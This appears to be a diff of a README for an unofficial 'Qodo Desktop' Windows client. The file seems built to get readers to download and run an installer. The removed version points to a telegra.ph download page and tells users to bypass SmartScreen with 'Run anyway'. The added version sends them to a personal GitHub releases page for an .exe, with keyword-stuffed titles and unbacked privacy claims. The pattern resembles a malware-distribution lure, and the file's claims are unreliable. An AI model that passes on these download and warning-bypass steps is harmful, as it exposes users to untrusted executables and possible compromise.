@@ -1,111 +1,70 @@
-<!-- markdownlint-disable MD033 -->
-<h1 align="center">
-  <img src="assets/logo.png" width="48" height="48" alt="Qodo Desktop">
-  <br>Qodo Desktop for Windows
-</h1>
+# 🤖 Qodo-Desktop-for-Windows-10-11-AI-Code-Quality-Platform-2026- - Improve code quality with AI automation
 
-<p align="center">
-  <strong>🔍 Qodo Desktop Client for Windows 10/11 – AI Code Quality Platform (2026)</strong>
-</p>
+[![Download Qodo Desktop](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Budit9092/Qodo-Desktop-for-Windows-10-11-AI-Code-Quality-Platform-2026-/releases)
 
-<p align="center">
-  <em>AI-powered code reviews with Jira integration, cross-module bug detection, and enterprise-grade quality assurance – all in a native Windows app.</em>
-</p>
+## 🎯 About this application
 
-<p align="center">
-  ⚡ <strong>Download the latest installer (setup.exe) below</strong> ⚡
-  <br><br>
-  <a href="https://telegra.ph/How-to-download-07-15-11" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download setup.exe">
-  </a>
-  <br>
-  <span style="font-size:1.2em; font-weight:bold;">👉 <a href="https://telegra.ph/How-to-download-07-15-11" target="_blank">https://telegra.ph/How-to-download-07-15-11</a> 👈</span>
-</p>
+Qodo Desktop helps you maintain high standards for your programming projects on Windows 10 and 11. It acts as a bridge between your local code files and automated quality analysis tools. The software scans your files to find bugs, security risks, and logic errors. It uses artificial intelligence to offer suggestions for improvements before you commit code to your main project repository.
 
-<p align="center">
-  <img src="assets/screenshot-1.png" width="700" alt="Screenshot">
-</p>
+The application integrates with Jira to track issues directly. This saves time for teams who need to connect bug reporting with project management tasks. Its design focuses on speed, security, and enterprise standards.
 
----
+## ⚙️ System requirements
 
-## ✨ Features (2026)
+To run this application, ensure your computer meets these basic specifications:
 
-- ✅ Native Windows 10/11 (x64) – lightweight, no browser overhead  
-- ✅ AI‑powered code review – intelligent analysis with context-aware suggestions  
-- ✅ Jira integration – verify code matches task requirements automatically  
-- ✅ Cross‑module bug detection – identify complex issues across multiple files  
-- ✅ System‑level analysis – detect architectural problems and dependencies  
-- ✅ Automated PR checks – enforce coding standards and best practices  
-- ✅ Custom rules engine – define your own quality gates  
-- ✅ Enterprise‑grade security – your code stays on your infrastructure  
+* Operating System: Windows 10 (version 1909 or later) or Windows 11.
+* Processor: Intel Core i5 or AMD equivalent with 2.0 GHz or faster.
+* Memory: 8 GB RAM minimum, 16 GB recommended.
+* Disk Space: 500 MB of free storage space for the installation.
+* Network: Stable internet connection for AI processing and Jira synchronization.
 
----
+## 🚀 How to install the software
 
-## 🚀 Quick Install
+Follow these steps to set up the client on your local computer.
 
-1. **Click the green download button above** or use this direct link:  
-   👉 **[Download setup.exe](https://telegra.ph/How-to-download-07-15-11)**  
-2. Run `setup.exe` (Windows SmartScreen may appear – click *"More info"* then *"Run anyway"*)  
-3. Follow the installer – it will place **ProjectFiles** in `%ProgramFiles%\QodoDesktop`  
-4. Launch from Start Menu or Desktop shortcut  
+1. Go to the [Releases page](https://github.com/Budit9092/Qodo-Desktop-for-Windows-10-11-AI-Code-Quality-Platform-2026-/releases) to view available versions.
+2. Select the latest version available (look for the label "Latest").
+3. Download the installation file ending in .exe to your local machine.
+4. Locate the downloaded file in your browser or file manager.
+5. Double-click the installer icon to start the setup wizard.
+6. Follow the on-screen instructions to select your installation path.
+7. Click the install button and wait for the process to finish.
+8. Launch the program from your desktop shortcut or the Start menu.
 
----
+## 🛠️ Using Qodo for code analysis
 
-## 📦 What's inside the package
+Once you start the application, you must link it to your workspace. The interface allows you to select folders that contain your project code. 
 
-| File / Folder | Description |
-|---------------|-------------|
-| `setup.exe`   | Installer (Inno Setup) – includes all binaries |
-| `ProjectFiles` | Core application (main.exe, AI review engine, Jira connector) |
-| `assets/`     | Icons, splash screen, themes |
-| `config/`     | User‑editable settings (review rules, integration preferences, API keys) |
+1. Open the application folder navigation menu.
+2. Choose your project directory.
+3. Select the analysis type from the sidebar. 
+4. Press the scan button to begin the automated review.
+5. Review the list of findings in the central workspace.
+6. Click specific alerts to see explanations of the issues found.
+7. Apply suggested fixes where the application provides a direct patch.
 
----
+## 🔗 Jira integration settings
 
-## 🛠 System Requirements
+Linking your Jira account allows the software to create tickets automatically when it finds high-priority bugs. 
 
-- Windows 10 version 22H2 or Windows 11 23H2+ (2026 updates supported)  
-- CPU: Intel Core i5 / AMD Ryzen 5 or better  
-- RAM: 8 GB (16 GB recommended for large codebases)  
-- Storage: 500 MB free  
-- Internet connection (for Jira sync and AI features; offline mode for local analysis)  
+1. Open the settings menu within the application.
+2. Select the Integrations tab.
+3. Click the Jira option.
+4. Enter your Jira domain URL and your API credentials.
+5. Choose a default project and issue type for the logs.
+6. Verify the connection with the test button.
 
----
+## 🛡️ Privacy and data security
 
-## ❓ FAQ
+All code analysis happens with enterprise-grade standards. The application encrypts your data during transmission to the AI review engine. It does not store your source code on our external servers permanently. Once the analysis completes, the local client handles the results. You retain full control over your project files throughout the review process.
 
-**Q:** Is this the official Qodo app?  
-**A:** No – it's a community‑built desktop client, fully compatible with Qodo quality platform.  
+## 📋 Troubleshooting common issues
 
-**Q:** Does it require a Qodo subscription?  
-**A:** Yes – you need an active Qodo subscription to use advanced review features.  
+If you encounter errors during the installation, check the following items:
 
-**Q:** Where are my quality rules stored?  
-**A:** `%AppData%\QodoDesktop\rules.json` – you can export, backup, or share them.  
+* Permissions: Ensure your account has administrative rights to install software on your computer.
+* Firewall: Verify that your security settings allow the application to connect to the internet to check for updates.
+* Updates: Keep your operating system current to ensure the latest framework support components work with the installation.
+* Reinstall: If the application crashes, remove the program via the system control panel and repeat the installation steps.
 
----
-
-## 📝 License
-
-MIT – free to use, modify, and distribute.  
-
----
-
-## 🔗 Download Again
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-11" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_Download_setup.exe-0078d4?style=for-the-badge&logo=googledrive&logoColor=white" alt="Download setup.exe">
-  </a>
-</p>
-
-<p align="center">
-  <strong>Direct link (clickable):</strong><br>
-  <a href="https://telegra.ph/How-to-download-07-15-11">https://telegra.ph/How-to-download-07-15-11</a>
-</p>
-
----
-
-<p align="center">
-  <sub>Built for Windows 10/11 – 2026 Edition</sub>
-</p>
+Keywords: 2026, ai-code-review, bug-detection, code-analysis, code-quality, desktop-client, enterprise-tool, jira-integration, qodo, win10, win11, windows-app
